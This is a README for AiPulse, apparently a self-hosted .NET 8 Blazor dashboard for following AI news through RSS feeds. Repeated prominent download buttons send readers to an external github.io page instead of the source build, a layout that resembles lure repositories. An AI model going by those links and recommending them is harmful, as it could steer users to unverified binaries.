# AiPulse v2026 - self-hosted dashboard 2026

> **AiPulse is a self-hosted dashboard built on .NET 8 and ASP.NET Core Blazor for AI-oriented developers, combining RSS updates, learning material, tools, and alerting in one up-to-date release.**

[![Platform](https://img.shields.io/badge/Platform-.NET%208%20%2F%20ASP.NET%20Core%20Blazor-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/alexjotmoore7104/aipulse-ai-news-hub?style=flat-square)](https://github.com/alexjotmoore7104/aipulse-ai-news-hub)

---

<p align="center">
  <a href="https://alexjotmoore7104.github.io/aipulse-ai-news-hub/">
    <img src="https://img.shields.io/badge/Download-AiPulse%20Latest-brightgreen?style=for-the-badge" alt="Download AiPulse">
  </a>
</p>

> **[Direct Download - AiPulse v2026](https://alexjotmoore7104.github.io/aipulse-ai-news-hub/)**

---

[Download Latest Build](https://alexjotmoore7104.github.io/aipulse-ai-news-hub/)

---

## About AiPulse

AiPulse is intended for anyone who wants a focused home for AI-related updates instead of managing a long list of browser tabs. It brings together live RSS and Atom feeds in a dashboard layout, making it easier to scan news, reference material, and practical utilities from a single self-hosted install.

It works well for developers, technical teams, and solo builders who need a flexible view of the changing AI landscape. Between learning resources, a tools matrix, watchlists, and digest features, AiPulse turns scattered information into something more organized and easier to act on.

---

## Features

- Live aggregation of RSS and Atom feeds
- Glossary plus learning hub for quick lookup
- Tools matrix with watchlist support for resource tracking
- Desktop notifications for new or relevant items
- Multi-user roles with admin approval workflows
- OPML import and export for feed portability
- Full-text fetching and scraping for expanded article views
- Weekly digest output and trending analytics

---

## Installation

Clone the repository and run it like a standard .NET 8 ASP.NET Core Blazor app.

1. Get the source:
   git clone https://github.com/alexjotmoore7104/aipulse-ai-news-hub.git
   cd AiPulse

2. Restore and build:
   dotnet restore
   dotnet build

3. Start the app:
   dotnet run

If you are using a published build rather than the source tree, download the latest package and start it according to your hosting setup.

---

## Usage

Once the app is running, open the dashboard in your browser and start by adding RSS or Atom sources. From there, you can group feeds, inspect fetched articles, and use the glossary and learning areas to explore terms and background information.

Typical workflow:
- Add or import feeds with OPML
- Review the news stream and trending items
- Save useful tools into the watchlist
- Enable desktop notifications for timely updates
- Check weekly digests to catch up on changes

For environments with multiple users, set roles and confirm approval settings before granting access to additional accounts.

---

## Configuration

Most options live in the ASP.NET Core host configuration for the application. Feed sources, notification settings, digest behavior, and role-related controls are commonly defined there or adjusted in the dashboard, depending on how you deploy AiPulse.

Example application settings pattern:

{
  "Feeds": [],
  "Notifications": {
    "Enabled": true
  },
  "Digests": {
    "Weekly": true
  }
}

If your hosting or authentication setup changes, make sure the related environment values or app configuration entries are updated to match your deployment.

---

## Requirements

- .NET 8 runtime or SDK
- ASP.NET Core hosting support
- A modern browser for the Blazor dashboard
- Network access for RSS/Atom sources and fetched article content
- Storage for feed data, watchlists, and digest history

---

## FAQ

**Do I need an AI model to use AiPulse?**  
No. AiPulse is a self-hosted dashboard for following AI-related content and resources, not an AI model runtime.

**Can I import feeds I already subscribe to?**  
Yes. OPML import and export are included so feed collections can be moved in and out of the system.

**How are updates delivered?**  
Use the latest build from the distribution you maintain, then rebuild or redeploy it as required for your setup.

**Where can I adjust notifications or digests?**  
Those controls are usually found in application settings or in the dashboard itself, depending on how you deploy it.

**What if fetched articles are missing content?**  
Review the full-text fetching and scraping settings, and verify whether the source site permits full article retrieval.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
